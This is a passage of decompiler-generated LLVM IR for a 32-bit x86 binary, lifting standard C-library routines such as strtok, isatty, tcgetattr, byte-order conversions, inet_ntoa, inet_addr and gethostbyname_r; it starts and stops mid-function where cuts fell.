  %v2_8052ac5 = load i8, i8* %v1_8052ab5, align 1
  %v3_8052ac5 = zext i8 %v2_8052ac5 to i32
  %v2_8052ac8 = load i8, i8* %v1_8052aab28, align 1
  %v3_8052ac8 = zext i8 %v2_8052ac8 to i32
  %v2_8052acb = mul nuw nsw i32 %v3_8052ac5, 2
  %v3_8052acb = add i32 %v2_8052acb, %v0_8052abf
  %v4_8052acb = inttoptr i32 %v3_8052acb to i16*
  %v5_8052acb = load i16, i16* %v4_8052acb, align 2
  %v6_8052acb = zext i16 %v5_8052acb to i32
  %v4_8052acf = mul nuw nsw i32 %v3_8052ac8, 2
  %v5_8052acf = add i32 %v4_8052acf, %v0_8052abf
  %v6_8052acf = inttoptr i32 %v5_8052acf to i16*
  %v7_8052acf = load i16, i16* %v6_8052acf, align 2
  %v18_8052acf = icmp eq i16 %v5_8052acb, %v7_8052acf
  %v1_8052ad3 = icmp eq i1 %v18_8052acf, false
  br i1 %v1_8052ad3, label %dec_label_pc_8052ad9, label %dec_label_pc_8052ad5

dec_label_pc_8052ad5:                             ; preds = %dec_label_pc_8052abf, %dec_label_pc_8052ab5
  %v4_8052ab546 = phi i32 [ %v0_8052abf, %dec_label_pc_8052abf ], [ %v6_8052ab5, %dec_label_pc_8052ab5 ]
  %v4_8052aab6 = phi i32 [ %v6_8052acb, %dec_label_pc_8052abf ], [ %v6_8052aab30, %dec_label_pc_8052ab5 ]
  %v1_8052ad5 = add i32 %v0_8052ad527, 1
  %v1_8052ad6 = add i32 %v0_8052ad626, 1
  %v1_8052aab = inttoptr i32 %v1_8052ad5 to i8*
  %v2_8052aab = load i8, i8* %v1_8052aab, align 1
  %v3_8052aab = zext i8 %v2_8052aab to i32
  %v5_8052aab = and i32 %v4_8052aab6, -256
  %v6_8052aab = or i32 %v3_8052aab, %v5_8052aab
  %v4_8052aad = icmp eq i8 %v2_8052aab, 0
  %v1_8052aaf = icmp eq i1 %v4_8052aad, false
  br i1 %v1_8052aaf, label %dec_label_pc_8052ab5, label %dec_label_pc_8052ae5

dec_label_pc_8052ad9:                             ; preds = %dec_label_pc_8052abf
  %v4_8052ad9 = icmp eq i8 %v2_8052ab5, 0
  br i1 %v4_8052ad9, label %dec_label_pc_8052ae3, label %dec_label_pc_8052ae0

dec_label_pc_8052ae0:                             ; preds = %dec_label_pc_8052ad9
  %v1_8052ae0 = add i32 %v0_8052ae039, 1
  %v2_8052aab19 = load i8, i8* %v1_8052aab18, align 1
  %v3_8052aab20 = zext i8 %v2_8052aab19 to i32
  %v5_8052aab21 = and i32 %v6_8052acb, 65280
  %v6_8052aab22 = or i32 %v3_8052aab20, %v5_8052aab21
  %v4_8052aad23 = icmp eq i8 %v2_8052aab19, 0
  %v1_8052aaf25 = icmp eq i1 %v4_8052aad23, false
  br i1 %v1_8052aaf25, label %dec_label_pc_8052ab5.lr.ph, label %dec_label_pc_8052ae5

dec_label_pc_8052ae3:                             ; preds = %dec_label_pc_8052ad9
  br label %dec_label_pc_8052ae5

dec_label_pc_8052ae5:                             ; preds = %dec_label_pc_8052ae0, %entry, %dec_label_pc_8052ad5, %dec_label_pc_8052ae3
  %storemerge = phi i32 [ 0, %dec_label_pc_8052ae3 ], [ %v4_8052a9f, %entry ], [ %v1_8052ae0, %dec_label_pc_8052ae0 ], [ %v0_8052ae039, %dec_label_pc_8052ad5 ]
  store i32 %v0_8052a9b, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8052aab19, { 1, 2, 0 }
  uselistorder i8 %v2_8052aab, { 1, 2, 0 }
  uselistorder i8* %v1_8052aab, { 1, 0 }
  uselistorder i32 %v0_8052abf, { 1, 2, 3, 0 }
  uselistorder i8 %v2_8052ab5, { 1, 0, 2 }
  uselistorder i32 %v0_8052ad626, { 1, 0 }
  uselistorder i8 %v2_8052aab1932, { 0, 2, 1 }
  uselistorder i8* %v1_8052aab18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052ae5, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052ab5, { 1, 0 }
  uselistorder label %dec_label_pc_8052ab5.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8052afc = inttoptr i32 %arg1 to i8*
  %v4_8052afc = call i32 @strtok_r(i8* %v3_8052afc, i32 %arg2, i32 ptrtoint (i32* @global_var_8061580.485 to i32))
  ret i32 %v4_8052afc
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8052b14 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8052b19 = icmp eq i32 %v3_8052b14, 0
  %v1_8052b1b = zext i1 %v1_8052b19 to i32
  ret i32 %v1_8052b1b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052b28 = load i32, i32* @esi, align 4
  %v0_8052b29 = load i32, i32* @ebx, align 4
  store i32 %v0_8052b29, i32* %stack_var_-8, align 4
  %v2_8052b2d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8052b2d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_8052b3f = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_8052b2d)
  store i32 %v3_8052b3f, i32* %eax.global-to-local, align 4
  %v1_8052b47 = icmp eq i32 %v3_8052b3f, 0
  store i32 %v3_8052b3f, i32* @esi, align 4
  %v1_8052b4b = icmp eq i1 %v1_8052b47, false
  br i1 %v1_8052b4b, label %dec_label_pc_8052b90, label %dec_label_pc_8052b4d

dec_label_pc_8052b4d:                             ; preds = %entry
  %v3_8052b4d = load i32, i32* %stack_var_-44, align 4
  %v1_8052b51 = load i32, i32* @ebx, align 4
  %v2_8052b51 = inttoptr i32 %v1_8052b51 to i32*
  store i32 %v3_8052b4d, i32* %v2_8052b51, align 4
  %v1_8052b57 = load i32, i32* @ebx, align 4
  %v2_8052b57 = add i32 %v1_8052b57, 4
  %v3_8052b57 = inttoptr i32 %v2_8052b57 to i32*
  %v1_8052b5e = load i32, i32* @ebx, align 4
  %v2_8052b5e = add i32 %v1_8052b5e, 8
  %v3_8052b5e = inttoptr i32 %v2_8052b5e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_8052b65 = load i32, i32* @ebx, align 4
  %v2_8052b65 = add i32 %v1_8052b65, 12
  %v3_8052b65 = inttoptr i32 %v2_8052b65 to i32*
  store i32 %tmp3, i32* %v3_8052b65, align 4
  %v4_8052b68 = zext i8 %tmp to i32
  %v5_8052b68 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052b68 = and i32 %v5_8052b68, -256
  %v7_8052b68 = or i32 %v6_8052b68, %v4_8052b68
  store i32 %v7_8052b68, i32* %eax.global-to-local, align 4
  %v2_8052b6c = load i32, i32* @ebx, align 4
  %v3_8052b6c = add i32 %v2_8052b6c, 16
  %v4_8052b6c = inttoptr i32 %v3_8052b6c to i8*
  store i8 %tmp, i8* %v4_8052b6c, align 1
  %v0_8052b6f = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b72 = ptrtoint i32* %stack_var_-27 to i32
  %v0_8052b77 = load i32, i32* @ebx, align 4
  %v1_8052b77 = add i32 %v0_8052b77, 17
  store i32 %v1_8052b77, i32* %eax.global-to-local, align 4
  %v4_8052b7b = call i32 @__GI_mempcpy(i32 %v1_8052b77, i32 %v2_8052b72, i32 19, i32 %v0_8052b6f)
  store i32 %v4_8052b7b, i32* %eax.global-to-local, align 4
  %v3_8052b88 = inttoptr i32 %v4_8052b7b to i8*
  %v4_8052b88 = call i32 @__GI_memset(i8* %v3_8052b88, i32 0, i32 13)
  store i32 %v4_8052b88, i32* %eax.global-to-local, align 4
  %v0_8052b93.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052b90

dec_label_pc_8052b90:                             ; preds = %entry, %dec_label_pc_8052b4d
  %v0_8052b93 = phi i32 [ %v3_8052b3f, %entry ], [ %v0_8052b93.pre, %dec_label_pc_8052b4d ]
  store i32 %v0_8052b93, i32* %eax.global-to-local, align 4
  %v2_8052b95 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052b95, i32* @ebx, align 4
  store i32 %v0_8052b28, i32* @esi, align 4
  ret i32 %v0_8052b93

; uselistorder directives
  uselistorder i32 %v0_8052b93, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052b90, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8052b9d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8052b9d = zext i16 %v3_8052b9d to i32
  ret i32 %v4_8052b9d
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8052ba9 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_8052ba9
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8052bb1 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8052bb1 = zext i16 %v3_8052bb1 to i32
  ret i32 %v4_8052bb1
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052bbd = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8052bbd
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052bc0 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8052bc3 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_8052bc6 = load i32, i32* @ebx, align 4
  store i32 %v0_8052bc6, i32* %stack_var_-12, align 4
  %v1_8052bcf = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_8052bcf, 16777216
  %v1_8052bd1 = sdiv i32 %sext, 16777216
  store i32 %v1_8052bd1, i32* @ebx, align 4
  %v1_8052bd3 = add i32 %arg2, 15
  store i32 %v1_8052bd3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052bd8

dec_label_pc_8052bd8:                             ; preds = %entry, %dec_label_pc_8052bfd
  %v0_8052bdf17 = phi i32 [ %v1_8052bd1, %entry ], [ %v2_8052bfd, %dec_label_pc_8052bfd ]
  %v0_8052c0916 = phi i32 [ %v1_8052bd3, %entry ], [ %v0_8052c01, %dec_label_pc_8052bfd ]
  %v1_8052be3 = urem i32 %v0_8052bdf17, 256
  %v5_8052beb = inttoptr i32 %v0_8052c0916 to i8*
  %v6_8052beb = call i32 @_uintmaxtostr(i8* %v5_8052beb, i32 %v1_8052be3, i32 0, i32 -10, i32 0)
  %v0_8052bf3 = load i32, i32* @esi, align 4
  %v1_8052bf3 = icmp eq i32 %v0_8052bf3, 0
  %v1_8052bf5 = add i32 %v6_8052beb, -1
  store i32 %v1_8052bf5, i32* %ecx.global-to-local, align 4
  br i1 %v1_8052bf3, label %dec_label_pc_8052bfd, label %dec_label_pc_8052bfa

dec_label_pc_8052bfa:                             ; preds = %dec_label_pc_8052bd8
  %v1_8052bfa = inttoptr i32 %v0_8052bf3 to i8*
  store i8 46, i8* %v1_8052bfa, align 1
  %v0_8052c01.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052bfd

dec_label_pc_8052bfd:                             ; preds = %dec_label_pc_8052bd8, %dec_label_pc_8052bfa
  %v0_8052c01 = phi i32 [ %v1_8052bf5, %dec_label_pc_8052bd8 ], [ %v0_8052c01.pre, %dec_label_pc_8052bfa ]
  %v0_8052bfd = load i32, i32* @ebx, align 4
  %v2_8052bfd = udiv i32 %v0_8052bfd, 256
  store i32 %v2_8052bfd, i32* @ebx, align 4
  %v0_8052c00 = load i32, i32* @edi, align 4
  %v1_8052c00 = add i32 %v0_8052c00, 1
  store i32 %v1_8052c00, i32* @edi, align 4
  store i32 %v0_8052c01, i32* @esi, align 4
  %v7_8052c06 = icmp sgt i32 %v1_8052c00, 3
  br i1 %v7_8052c06, label %dec_label_pc_8052c08, label %dec_label_pc_8052bd8

dec_label_pc_8052c08:                             ; preds = %dec_label_pc_8052bfd
  %v2_8052c08 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052c08, i32* @ebx, align 4
  %v1_8052c09 = add i32 %v0_8052c01, 1
  store i32 %v0_8052bc3, i32* @esi, align 4
  store i32 %v0_8052bc0, i32* @edi, align 4
  ret i32 %v1_8052c09

; uselistorder directives
  uselistorder i32 %v0_8052c01, { 0, 2, 1 }
  uselistorder i32 %v1_8052bd1, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052bfd, { 1, 0 }
  uselistorder label %dec_label_pc_8052bd8, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8052c1b = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_8061584.486 to i32))
  ret i32 %v2_8052c1b
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052c27 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8052c30 = inttoptr i32 %arg1 to i8*
  %v3_8052c30 = call i32 @inet_aton(i8* %v2_8052c30, i32 %v2_8052c27)
  %v1_8052c3b = icmp eq i32 %v3_8052c30, 0
  br i1 %v1_8052c3b, label %dec_label_pc_8052c43, label %dec_label_pc_8052c3f

dec_label_pc_8052c3f:                             ; preds = %entry
  %v3_8052c3f = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c43

dec_label_pc_8052c43:                             ; preds = %entry, %dec_label_pc_8052c3f
  %v0_8052c43 = phi i32 [ -1, %entry ], [ %v3_8052c3f, %dec_label_pc_8052c3f ]
  ret i32 %v0_8052c43

; uselistorder directives
  uselistorder label %dec_label_pc_8052c43, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052c4f = call i32 @__GI___h_errno_location()
  %v0_8052c54 = load i32, i32* @edx, align 4
  %v2_8052c57 = ptrtoint i32* %stack_var_-4 to i32
  %v9_8052c6f = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806176c.488, i32 ptrtoint (i32* @global_var_80615a0.487 to i32), i32 460, i32 %v2_8052c57, i32 %v0_8052c4f, i32 %v0_8052c54, i32 %v0_8052c54)
  %v3_8052c74 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8052c74
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8052c7c = load i32, i32* @ebp, align 4
  %v0_8052c7d = load i32, i32* @edi, align 4
  %v0_8052c7e = load i32, i32* @esi, align 4
  %v0_8052c7f = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8052c8f = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8052c8f, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8052c9a = icmp eq i32 %arg1, 0
  br i1 %v4_8052c9a, label %dec_label_pc_8052fa6, label %dec_label_pc_8052ca5

dec_label_pc_8052ca5:                             ; preds = %entry
  %v1_8052ca5 = call i32 @__errno_location(i32 %v0_8052c7f)
  store i32 %v1_8052ca5, i32* %eax.global-to-local, align 4
  %v1_8052caa = inttoptr i32 %v1_8052ca5 to i32*
  %v2_8052caa = load i32, i32* %v1_8052caa, align 4
  store i32 %v2_8052caa, i32* @edi, align 4
  store i32 %v1_8052ca5, i32* @esi, align 4
  store i32 0, i32* %v1_8052caa, align 4
  %v0_8052cbd = load i32, i32* @ebx, align 4
  store i32 %v0_8052cbd, i32* %stack_var_-108, align 4
  %v7_8052cc9 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8052cbd, i32 %arg5, i32 %arg6, i32 %v1_8052ca5)
  store i32 %v7_8052cc9, i32* %eax.global-to-local, align 4
  %v1_8052cd1 = icmp eq i32 %v7_8052cc9, 0
  br i1 %v1_8052cd1, label %dec_label_pc_8052fa6, label %dec_label_pc_8052cd9

dec_label_pc_8052cd9:                             ; preds = %dec_label_pc_8052ca5
  %v1_8052cdd = inttoptr i32 %arg6 to i32*
  %v2_8052cdd = load i32, i32* %v1_8052cdd, align 4
  store i32 %v2_8052cdd, i32* %edx.global-to-local, align 4
  %v9_8052cdf = icmp eq i32 %v2_8052cdd, 1
  br i1 %v9_8052cdf, label %dec_label_pc_8052cf9, label %dec_label_pc_8052ce4

dec_label_pc_8052ce4:                             ; preds = %dec_label_pc_8052cd9
  %v9_8052ce4 = icmp eq i32 %v2_8052cdd, 4
  br i1 %v9_8052ce4, label %dec_label_pc_8052cf9, label %dec_label_pc_8052ce9

dec_label_pc_8052ce9:                             ; preds = %dec_label_pc_8052ce4
  %v1_8052ce9 = add i32 %v2_8052cdd, 1
  %v8_8052ce9 = icmp eq i32 %v1_8052ce9, 0
  store i32 %v1_8052ce9, i32* %edx.global-to-local, align 4
  %v1_8052cea = icmp eq i1 %v8_8052ce9, false
  br i1 %v1_8052cea, label %dec_label_pc_8052fa6, label %dec_label_pc_8052cf0

dec_label_pc_8052cf0:                             ; preds = %dec_label_pc_8052ce9
  %v0_8052cf0 = load i32, i32* @esi, align 4
  %v1_8052cf0 = inttoptr i32 %v0_8052cf0 to i32*
  %v2_8052cf0 = load i32, i32* %v1_8052cf0, align 4
  %v11_8052cf0 = icmp eq i32 %v2_8052cf0, 2
  %v1_8052cf3 = icmp eq i1 %v11_8052cf0, false
  br i1 %v1_8052cf3, label %dec_label_pc_8052fa6, label %dec_label_pc_8052cf9

dec_label_pc_8052cf9:                             ; preds = %dec_label_pc_8052cf0, %dec_label_pc_8052ce4, %dec_label_pc_8052cd9
  %v0_8052cf9 = load i32, i32* @ebp, align 4
  %v1_8052cfb = sub i32 0, %v0_8052cf9
  %v1_8052cfd = urem i32 %v1_8052cfb, 4
  %v2_8052cfd = icmp eq i32 %v1_8052cfd, 0
  store i32 %v1_8052cfd, i32* %eax.global-to-local, align 4
  %v0_8052d00 = load i32, i32* @edi, align 4
  %v1_8052d00 = load i32, i32* @esi, align 4
  %v2_8052d00 = inttoptr i32 %v1_8052d00 to i32*
  store i32 %v0_8052d00, i32* %v2_8052d00, align 4
  %v0_8052d14.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8052cfd, label %dec_label_pc_8052d10, label %dec_label_pc_8052d04

dec_label_pc_8052d04:                             ; preds = %dec_label_pc_8052cf9
  %v1_8052d04 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052d04 = sub i32 %v0_8052d14.pre, %v1_8052d04
  %v7_8052d04 = icmp ult i32 %v0_8052d14.pre, %v1_8052d04
  br i1 %v7_8052d04, label %dec_label_pc_8052fa1, label %dec_label_pc_8052d0c

dec_label_pc_8052d0c:                             ; preds = %dec_label_pc_8052d04
  %v0_8052d0c = load i32, i32* @ebp, align 4
  %v2_8052d0c = add i32 %v0_8052d0c, %v1_8052d04
  store i32 %v2_8052d0c, i32* @ebp, align 4
  store i32 %v2_8052d04, i32* @ebx, align 4
  br label %dec_label_pc_8052d10

dec_label_pc_8052d10:                             ; preds = %dec_label_pc_8052cf9, %dec_label_pc_8052d0c
  %v0_8052d14 = phi i32 [ %v2_8052d04, %dec_label_pc_8052d0c ], [ %v0_8052d14.pre, %dec_label_pc_8052cf9 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8052cdd, align 4
  %tmp41 = icmp ult i32 %v0_8052d14, 4
  br i1 %tmp41, label %dec_label_pc_8052fa1, label %dec_label_pc_8052d23

dec_label_pc_8052d23:                             ; preds = %dec_label_pc_8052d10
  %v0_8052d23 = load i32, i32* @ebx, align 4
  %v1_8052d23 = add i32 %v0_8052d23, -4
  store i32 %v1_8052d23, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_8052d23, 8
  br i1 %tmp42, label %dec_label_pc_8052fa1, label %dec_label_pc_8052d2f

dec_label_pc_8052d2f:                             ; preds = %dec_label_pc_8052d23
  %v1_8052d2f = add i32 %v0_8052d23, -12
  store i32 %v1_8052d2f, i32* %eax.global-to-local, align 4
  %v0_8052d32 = load i32, i32* @ebp, align 4
  %v1_8052d32 = add i32 %v0_8052d32, 4
  store i32 %v1_8052d32, i32* %edx.global-to-local, align 4
  store i32 %v1_8052d32, i32* %stack_var_-92, align 4
  %v3_8052d3b = inttoptr i32 %v1_8052d32 to i32*
  store i32 %v0_8052d32, i32* %v3_8052d3b, align 4
  %v0_8052d3e = load i32, i32* %edx.global-to-local, align 4
  %v1_8052d3e = add i32 %v0_8052d3e, 4
  %v2_8052d3e = inttoptr i32 %v1_8052d3e to i32*
  store i32 0, i32* %v2_8052d3e, align 4
  %tmp43 = icmp ult i32 %v1_8052d2f, 32
  br i1 %tmp43, label %dec_label_pc_8052fa1, label %dec_label_pc_8052d4b

dec_label_pc_8052d4b:                             ; preds = %dec_label_pc_8052d2f
  %v0_8052d4b = load i32, i32* @ebx, align 4
  %v1_8052d4b = add i32 %v0_8052d4b, -44
  store i32 %v1_8052d4b, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_8052d4b, 256
  br i1 %tmp44, label %dec_label_pc_8052fa1, label %dec_label_pc_8052d5e

dec_label_pc_8052d5e:                             ; preds = %dec_label_pc_8052d4b
  %v0_8052d5e = load i32, i32* @ebp, align 4
  %v1_8052d5e = add i32 %v0_8052d5e, 12
  %v1_8052d65 = add i32 %v0_8052d5e, 44
  store i32 %v1_8052d65, i32* @edi, align 4
  store i32 %v1_8052d65, i32* %stack_var_-108, align 4
  %v3_8052d72 = inttoptr i32 %v1_8052d65 to i8*
  %v4_8052d72 = call i32 @strncpy(i8* %v3_8052d72, i32 %arg1, i32 %v1_8052d4b)
  %v0_8052d77 = load i32, i32* @edi, align 4
  %v1_8052d77 = load i32, i32* @ebp, align 4
  %v2_8052d77 = add i32 %v1_8052d77, 12
  %v3_8052d77 = inttoptr i32 %v2_8052d77 to i32*
  store i32 %v0_8052d77, i32* %v3_8052d77, align 4
  %v1_8052d7e = add i32 %v0_8052d5e, 16
  %v2_8052d7e = inttoptr i32 %v1_8052d7e to i32*
  store i32 0, i32* %v2_8052d7e, align 4
  %v2_8052d85 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052d85, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8052d87 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8052d8c = inttoptr i32 %arg1 to i8*
  %v3_8052d8c = call i32 @inet_aton(i8* %v2_8052d8c, i32 %v0_8052d87)
  store i32 %v3_8052d8c, i32* %eax.global-to-local, align 4
  %v1_8052d94 = icmp eq i32 %v3_8052d8c, 0
  br i1 %v1_8052d94, label %dec_label_pc_8052dd0, label %dec_label_pc_8052d98

dec_label_pc_8052d98:                             ; preds = %dec_label_pc_8052d5e
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8052d9c = load i32, i32* @edi, align 4
  store i32 %v0_8052d9c, i32* %arg2, align 4
  %v1_8052d9e = add i32 %tmp18, 8
  %v2_8052d9e = inttoptr i32 %v1_8052d9e to i32*
  store i32 2, i32* %v2_8052d9e, align 4
  %v0_8052da5 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052da5 = add i32 %v0_8052da5, 12
  %v2_8052da5 = inttoptr i32 %v1_8052da5 to i32*
  store i32 4, i32* %v2_8052da5, align 4
  %v2_8052dac = load i32, i32* %stack_var_-92, align 4
  %v1_8052daf = load i32, i32* %edx.global-to-local, align 4
  %v2_8052daf = add i32 %v1_8052daf, 16
  %v3_8052daf = inttoptr i32 %v2_8052daf to i32*
  store i32 %v2_8052dac, i32* %v3_8052daf, align 4
  %v1_8052db6 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052db6 = add i32 %v1_8052db6, 4
  %v3_8052db6 = inttoptr i32 %v2_8052db6 to i32*
  store i32 %v1_8052d5e, i32* %v3_8052db6, align 4
  %v0_8052dbd = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8052dbd, i32* %v1_8052c8f, align 4
  store i32 0, i32* %v1_8052cdd, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052fa6

dec_label_pc_8052dd0:                             ; preds = %dec_label_pc_8052d5e
  %v0_8052dd0 = call i32 @__open_nameservers()
  store i32 %v0_8052dd0, i32* @eax, align 4
  %v2_8052de0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8052de0, i32* @ebx, align 4
  store i32 %v2_8052de0, i32* %stack_var_-108, align 4
  %v2_8052de5 = call i32 @__pthread_return_void(i32 %v2_8052de0, i32 134565087)
  store i32 %v2_8052de5, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %stack_var_-108, align 4
  %v1_8052df1 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b508.489 to i32))
  %v0_8052df6 = load i32, i32* @global_var_8061bf4.490, align 4
  store i32 %v0_8052df6, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* @ecx, align 4
  store i32 134565087, i32* @eax, align 4
  store i32 %v2_8052de0, i32* %stack_var_-108, align 4
  %v2_8052e01 = call i32 @__pthread_return_void(i32 %v2_8052de0, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8052e1c = ptrtoint i32* %stack_var_-76 to i32
  %v2_8052e21 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052e21, i32* %eax.global-to-local, align 4
  store i32 %v2_8052e21, i32* %stack_var_-108, align 4
  %v0_8052e2b = load i32, i32* @esi, align 4
  %v7_8052e32 = call i32 @__dns_lookup(i8* %v2_8052d8c, i32 1, i32 %v0_8052e2b, i32 ptrtoint (i32* @global_var_8061be8.491 to i32), i32 %v2_8052e21, i32 %v2_8052e1c)
  store i32 %v7_8052e32, i32* %eax.global-to-local, align 4
  %v2_8052e3a = icmp slt i32 %v7_8052e32, 0
  %v1_8052e3c = icmp eq i1 %v2_8052e3a, false
  br i1 %v1_8052e3c, label %dec_label_pc_8052e52, label %dec_label_pc_8052e3e

dec_label_pc_8052e3e:                             ; preds = %dec_label_pc_8052dd0
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8052cdd, align 4
  br label %dec_label_pc_8052fa6

dec_label_pc_8052e52:                             ; preds = %dec_label_pc_8052dd0
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8052e65 = icmp ugt i32 %v1_8052d4b, 256
  %v15_8052e65 = icmp eq i32 %v0_8052d4b, 300
  %v2_8052e69 = or i1 %v10_8052e65, %v15_8052e65
  br i1 %v2_8052e69, label %dec_label_pc_8052f04, label %dec_label_pc_8052e6b

dec_label_pc_8052e6b:                             ; preds = %dec_label_pc_8052e52
  %v3_8052e6e = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8052e6e, i32* %stack_var_-108, align 4
  %v1_8052e72 = call i32 @free(i32 %v3_8052e6e)
  store i32 %v1_8052e72, i32* %eax.global-to-local, align 4
  store i32 %v3_8052e6e, i32* @edi, align 4
  %v3_8052e78 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052e78, i32* %stack_var_-108, align 4
  %v1_8052e7c = call i32 @free(i32 %v3_8052e78)
  store i32 -1, i32* %v1_8052cdd, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f7c

dec_label_pc_8052f04:                             ; preds = %dec_label_pc_8052e52
  %v3_8052f09.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8052f0d.pre = load i32, i32* @edi, align 4
  store i32 %v0_8052f0d.pre, i32* %stack_var_-108, align 4
  %v3_8052f0e = inttoptr i32 %v0_8052f0d.pre to i8*
  %v4_8052f0e = call i32 @strncpy(i8* %v3_8052f0e, i32 %v3_8052f09.pre, i32 %v1_8052d4b)
  store i32 %v4_8052f0e, i32* %eax.global-to-local, align 4
  %v3_8052f14 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8052f14, i32* %stack_var_-108, align 4
  %v1_8052f18 = call i32 @free(i32 %v3_8052f14)
  store i32 %v1_8052f18, i32* %eax.global-to-local, align 4
